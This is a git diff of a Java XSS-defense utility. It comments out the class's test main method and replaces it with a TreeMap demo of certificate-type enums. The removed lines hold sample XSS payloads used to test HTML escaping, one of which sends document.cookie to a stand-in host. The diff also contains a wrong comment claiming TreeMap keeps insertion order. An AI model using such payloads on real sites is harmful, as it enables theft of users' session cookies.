@@ -5,6 +5,10 @@
  */
 package com.creditcloud.common.utils;
 
+import com.creditcloud.model.enums.user.credit.CertificateType;
+import java.util.HashMap;
+import java.util.Map;
+import java.util.TreeMap;
 import org.apache.commons.lang3.StringEscapeUtils;
 
 /**
@@ -26,15 +30,24 @@ public class XssDefenseUtil {
         return inputString;
     }
 
-    public static void main(String[] args) {
-        String inputString = "<script>测试中文window.location.href=\"http://www.baidu.com\";</script>";
-        //利用第三方包处理的
-        System.out.println(XssDefenseUtil.escapeHtml(inputString));
-        inputString = "测试中文<</span></&";
-        System.out.println(XssDefenseUtil.htmlEncode(inputString));
-        //另一种自定义处理方式
-        inputString = "测试中文<script>window.open(\"www.b.com?param=\"+document.cookie)</script>";
-        System.out.println(XssDefenseUtil.htmlEncode(inputString));
+    public static void main(String[] args) { 
+//        String inputString = "<script>测试中文window.location.href=\"http://www.baidu.com\";</script>";
+//        //利用第三方包处理的
+//        System.out.println(XssDefenseUtil.escapeHtml(inputString));
+//        inputString = "测试中文<</span></&";
+//        System.out.println(XssDefenseUtil.htmlEncode(inputString));
+//        //另一种自定义处理方式
+//        inputString = "测试中文<script>window.open(\"www.b.com?param=\"+document.cookie)</script>";
+//        System.out.println(XssDefenseUtil.htmlEncode(inputString));
+        
+        //TreeMap:保证按放入顺序输出, HashMap:不保证按放入顺序输出,
+        Map<Object, Object> certificates = new TreeMap();
+        certificates.put(CertificateType.ORIGINALAGREEMENT, CertificateType.ORIGINALAGREEMENT.getKey());
+        certificates.put(CertificateType.BANKTRADE, CertificateType.BANKTRADE.getKey());
+        certificates.put(CertificateType.OWNERSHIPREGIST, CertificateType.OWNERSHIPREGIST.getKey());
+        certificates.put(CertificateType.FINANCIERIDENTITY, CertificateType.FINANCIERIDENTITY.getKey());
+        certificates.put(CertificateType.GRANTERIDENTITY, CertificateType.GRANTERIDENTITY.getKey());
+        System.out.println(certificates);
     }
 
     private static String htmlEncode(char c) {
